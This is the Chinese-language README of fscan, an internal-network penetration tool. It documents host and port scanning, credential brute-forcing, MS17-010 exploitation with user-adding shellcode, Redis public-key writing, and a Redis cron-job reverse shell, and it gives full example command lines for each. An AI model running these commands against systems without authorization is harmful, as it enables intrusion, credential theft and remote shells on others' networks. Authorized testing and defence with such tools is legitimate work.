## fscan <https://github.com/shadow1ng/fscan>
<!--auto_detail_badge_begin_0b490ffb61b26b45de3ea5d7dd8a582e-->
![Language](https://img.shields.io/badge/Language-Golang-blue)
![Author](https://img.shields.io/badge/Author-shadow1ng-orange)
![GitHub stars](https://img.shields.io/github/stars/shadow1ng/fscan.svg?style=flat&logo=github)
![Version](https://img.shields.io/badge/Version-V1.8.4-red)
![Time](https://img.shields.io/badge/Join-20210422-green)
<!--auto_detail_badge_end_fef74f2d7ea73fcc43ff78e05b1e7451-->

# 简介
一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。   
支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能。

## 主要功能
1.信息搜集:
* 存活探测(icmp)
* 端口扫描

2.爆破功能:
* 各类服务爆破(ssh、smb、rdp等)
* 数据库密码爆破(mysql、mssql、redis、psql、oracle等)  

3.系统信息、漏洞扫描:  
* netbios探测、域控识别  
* 获取目标网卡信息
* 高危漏洞扫描(ms17010等)  

4.Web探测功能:
* webtitle探测
* web指纹识别(常见cms、oa框架等)
* web漏洞扫描(weblogic、st2等,支持xray的poc)

5.漏洞利用:
* redis写公钥或写计划任务  
* ssh命令执行  
* ms17017利用(植入shellcode),如添加用户等  

6.其他功能:
* 文件保存

## usege
简单用法
``` 
fscan.exe -h 192.168.1.1/24  (默认使用全部模块)
fscan.exe -h 192.168.1.1/16  (B段扫描)
```

其他用法
```
fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)
fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)
fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)
fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)
fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)
fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名、密码来进行爆破)
fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径) 
fscan.exe -h 192.168.1.1/8  (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )
fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)
fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)
fscan.exe -hf ip.txt  (以文件导入)
fscan.exe -u http://baidu.com -proxy 8080 (扫描单个url,并设置http代理 http://127.0.0.1:8080)
fscan.exe -h 192.168.1.1/24 -nobr -nopoc (不进行爆破,不扫Web poc,以减少流量)
fscan.exe -h 192.168.1.1/24 -pa 3389 (在原基础上,加入3389->rdp扫描)
fscan.exe -h 192.168.1.1/24 -socks5 127.0.0.1:1080
fscan.exe -h 192.168.1.1/24 -m ms17017 -sc add (可在ms17010-exp.go自定义shellcode,内置添加用户等功能)
```
编译命令
```
go build -ldflags="-s -w " -trimpath
```

完整参数
```
  -c string
        ssh命令执行
  -cookie string
        设置cookie
  -debug int
        多久没响应,就打印当前进度(default 60)
  -domain string
        smb爆破模块时,设置域名
  -h string
        目标ip: 192.168.11.11 | 192.168.11.11-255 | 192.168.11.11,192.168.11.12
  -hf string
        读取文件中的目标
  -hn string
        扫描时,要跳过的ip: -hn 192.168.1.1/24
  -m string
        设置扫描模式: -m ssh (default "all")
  -no
        扫描结果不保存到文件中
  -nobr
        跳过sql、ftp、ssh等的密码爆破
  -nopoc
        跳过web poc扫描
  -np
        跳过存活探测
  -num int
        web poc 发包速率  (default 20)
  -o string
        扫描结果保存到哪 (default "result.txt")
  -p string
        设置扫描的端口: 22 | 1-65535 | 22,80,3306 (default "21,22,80,81,135,139,443,445,1433,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017")
  -pa string
        新增需要扫描的端口,-pa 3389 (会在原有端口列表基础上,新增该端口)
  -path string
        fcgi、smb romote file path
  -ping
        使用ping代替icmp进行存活探测
  -pn string
        扫描时要跳过的端口,as: -pn 445
  -pocname string
        指定web poc的模糊名字, -pocname weblogic
  -proxy string
        设置代理, -proxy http://127.0.0.1:8080
  -user string
        指定爆破时的用户名
  -userf string
        指定爆破时的用户名文件
  -pwd string
        指定爆破时的密码
  -pwdf string
        指定爆破时的密码文件
  -rf string
        指定redis写公钥用模块的文件 (as: -rf id_rsa.pub)
  -rs string
        redis计划任务反弹shell的ip端口 (as: -rs 192.168.1.1:6666)
  -silent
        静默扫描,适合cs扫描时不回显
  -sshkey string
        ssh连接时,指定ssh私钥
  -t int
        扫描线程 (default 600)
  -time int
        端口扫描超时时间 (default 3)
  -u string
        指定Url扫描
  -uf string
        指定Url文件扫描
  -wt int
        web访问超时时间 (default 5)
  -pocpath string
        指定poc路径
  -usera string
        在原有用户字典基础上,新增新用户
  -pwda string
        在原有密码字典基础上,增加新密码
  -socks5
        指定socks5代理 (as: -socks5  socks5://127.0.0.1:1080)
  -sc 
        指定ms17010利用模块shellcode,内置添加用户等功能 (as: -sc add)
```

## 运行截图

`fscan.exe -h 192.168.x.x  (全功能、ms17010、读取网卡信息)`
![](https://github.com/shadow1ng/fscan/raw/main/image/1.png)

![](https://github.com/shadow1ng/fscan/raw/main/image/4.png)

`fscan.exe -h 192.168.x.x -rf id_rsa.pub (redis 写公钥)`
![](https://github.com/shadow1ng/fscan/raw/main/image/2.png)

`fscan.exe -h 192.168.x.x -c "whoami;id" (ssh 命令)`
![](https://github.com/shadow1ng/fscan/raw/main/image/3.png)

`fscan.exe -h 192.168.x.x -p80 -proxy http://127.0.0.1:8080 一键支持xray的poc`
![](https://github.com/shadow1ng/fscan/raw/main/image/2020-12-12-13-34-44.png)

`fscan.exe -h 192.168.x.x -p 139 (netbios探测、域控识别,下图的[+]DC代表域控)`
![](https://github.com/shadow1ng/fscan/raw/main/image/netbios.png)

`go run .\main.go -h 192.168.x.x/24 -m netbios(-m netbios时,才会显示完整的netbios信息)`
![](https://github.com/shadow1ng/fscan/raw/main/image/netbios1.png)

`go run .\main.go -h 192.0.0.0/8 -m icmp(探测每个C段的网关和数个随机IP,并统计top 10 B、C段存活数量)`
![img.png](https://github.com/shadow1ng/fscan/raw/main/image/live.png)


<!--auto_detail_active_begin_e1c6fb434b6f0baf6912c7a1934f772b-->
## 项目相关

- 2022-12-09 发布演示视频[404星链计划开源安全工具演示——fscan](https://www.bilibili.com/video/BV1Cv4y1R72M/)

## 最近更新

#### [v1.8.4] - 2024-05-11

**更新**  
* 优化报错处理，避免部分扫描模块报错后导致的程序退出  
* linux(amd64)默认使用fscan  
* windows(x64)默认使用fscan.exe

#### [v1.8.2] - 2022-11-19

**更新**  
- 新增 hash 碰撞  
- 新增 wmiiexec 无回显命令执行

#### [v1.8.1] - 2022-07-06

**更新**  
- 加入手工gc回收,尝试节省无用内存  
- -url 支持逗号隔开  
- 修复一个poc模块bug

#### [v1.8.0] - 2022-07-02

**更新**  
- 加强poc fuzz模块,支持跑备份文件、目录、shiro-key等  
- 新增ms17017利用,可在ms17010-exp.go自定义shellcode,内置添加用户等功能  
- 新增poc、指纹  
- 支持socks5代理  
- 因body指纹更全,默认不再跑ico图标

#### [v1.7.1] - 2022-04-20

**更新**  
- poc模块现加入指定目录或文件  
- 端口可指定文件  
- rdp加入多线程爆破(demo)

<!--auto_detail_active_end_f9cf7911015e9913b7e691a7a5878527-->
